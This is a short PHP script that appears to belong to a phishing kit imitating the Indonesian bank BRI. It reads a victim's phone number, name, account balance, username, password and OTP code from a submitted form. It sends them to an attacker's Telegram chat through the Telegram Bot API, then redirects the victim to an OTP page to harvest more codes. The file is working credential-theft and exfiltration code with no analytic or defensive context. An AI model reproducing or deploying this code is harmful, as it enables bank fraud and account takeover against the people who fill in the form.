<?php 



session_start();
include "./telegram.php";

$_SESSION["nomorkus"] = $_POST ['nomorku'];
$_SESSION["debits"] = $_POST ['debit'];
$_SESSION["namas"] = $_POST ['nama'];

$message = "༺═★⊱━━ⒷⓇⒾ━━⊰★═༻". "\n✮ 𝗡𝗼𝗺𝗼𝗿 𝗛𝗽 : ".  $_POST ['nomor']. "\n⍣ 𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽 : ". $_POST ['nama']. "\n⍣ 𝗦𝗮𝗹𝗱𝗼 : ". $_POST ['saldo']. "\n⍣ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : ". $_POST ['user']. "\n⍣ 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 : ". $_POST ['pass']. "\n✮ 𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 : ". $_POST ['otp'];
function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header("Location:  otp.html");
?> 